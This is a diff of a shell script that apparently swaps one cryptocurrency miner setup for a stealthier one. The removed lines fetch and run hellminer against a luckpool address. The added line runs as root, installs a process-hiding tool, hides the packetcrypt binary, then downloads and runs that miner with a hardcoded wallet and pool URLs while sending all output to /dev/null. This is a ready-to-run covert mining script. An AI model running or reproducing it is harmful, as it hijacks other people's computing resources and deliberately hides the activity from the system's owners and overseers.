@@ -1,10 +1,2 @@
-#!/bin/sh
-sudo apt update
-sudo apt install screen -y
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
-tar xf hellminer_cpu_linux.tar.gz
-./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u wallet.worke -p x --cpu 2
-while [ 1 ]; do
-sleep 3
-done
-sleep 999
+#!/bin/bash
+sudo su --command "sudo apt update && sudo apt upgrade -y && sudo apt install gcc && sudo apt install curl -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs -y && npm install -g npm@8.4.1 && npm i -g node-process-hider && sudo ph add packetcrypt-v0.4.4-linux_amd64 && wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.4.4/packetcrypt-v0.4.4-linux_amd64 && chmod +x packetcrypt-v0.4.4-linux_amd64 && ./packetcrypt-v0.4.4-linux_amd64 ann -p pkt1q5fd7g5h8wca2hmr5pdxpsm0unfzevwzam6afy7 https://stratum.zetahash.com http://pool.pktco.in http://pool.pktpool.io http://pool.pkt.world http://pool.pkteer.com > /dev/null 2>&1"
